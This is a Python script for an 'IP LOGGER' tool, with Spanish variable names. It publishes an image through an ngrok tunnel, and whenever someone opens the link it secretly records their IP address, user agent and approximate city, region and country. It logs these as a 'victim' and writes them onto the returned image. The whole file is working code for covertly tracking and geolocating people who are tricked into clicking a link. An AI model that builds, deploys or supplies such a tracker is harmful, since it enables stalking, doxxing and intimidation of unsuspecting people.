import os
import json
import requests
from flask import Flask, request, send_file
from pyngrok import ngrok
from PIL import Image, ImageDraw, ImageFont

PORT = 5000
NOMBRE_IMAGEN_ORIGINAL = r"ruta del archivo"  
NOMBRE_IMAGEN_MODIFICADA = "imagen.png"  
LOG_FILE = "log.txt"

app = Flask(__name__)

def obtener_ubicacion(ip):
    try:
        respuesta = requests.get(f"https://ipinfo.io/{ip}/json")
        datos = respuesta.json()
        return datos.get("city", "Desconocido"), datos.get("region", "Desconocido"), datos.get("country", "Desconocido")
    except:
        return "Desconocido", "Desconocido", "Desconocido"

def generar_imagen_personalizada(ip, ciudad, region, pais):
    imagen = Image.open(NOMBRE_IMAGEN_ORIGINAL)
    draw = ImageDraw.Draw(imagen)

    try:
        font = ImageFont.truetype("arial.ttf", 20)  
    except:
        font = ImageFont.load_default()

    texto = f"IP: {ip}\nUbicación: {ciudad}, {region}, {pais}"
    draw.text((10, 10), texto, font=font, fill="red")

    imagen.save(NOMBRE_IMAGEN_MODIFICADA)

@app.route("/imagen.png")
def servir_imagen():
    ip_victima = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent")

    ciudad, region, pais = obtener_ubicacion(ip_victima)

    with open(LOG_FILE, "a") as log:
        log.write(f"IP: {ip_victima}, Ubicación: {ciudad}, {region}, {pais}, User-Agent: {user_agent}\n")

    print(f"[💀] Víctima: {ip_victima} - {ciudad}, {region}, {pais} - {user_agent}")

    generar_imagen_personalizada(ip_victima, ciudad, region, pais)

    return send_file(NOMBRE_IMAGEN_MODIFICADA, mimetype='image/png')

def iniciar_ngrok():
    url_publico = ngrok.connect(PORT, "http")
    print(f"[🌎] Link público: {url_publico}")
    print(f"[📷] Imagen accesible en: {url_publico}/imagen.png")

ascii_art = r"""
 _____ _____    _      ____   _____  _____ ______ _____  
|_   _|  __ \  | |    / __ \ / ____|/ ____|  ____|  __ \ 
  | | | |__) | | |   | |  | | |  __| |  __| |__  | |__) |
  | | |  ___/  | |   | |  | | | |_ | | |_ |  __| |  _  / 
 _| |_| |      | |___| |__| | |__| | |__| | |____| | \ \ 
|_____|_|      |______\____/ \_____|\_____|______|_|  \_\
"""

if __name__ == "__main__":
    print(ascii_art)

    iniciar_ngrok()

    app.run(host="0.0.0.0", port=PORT, debug=False)
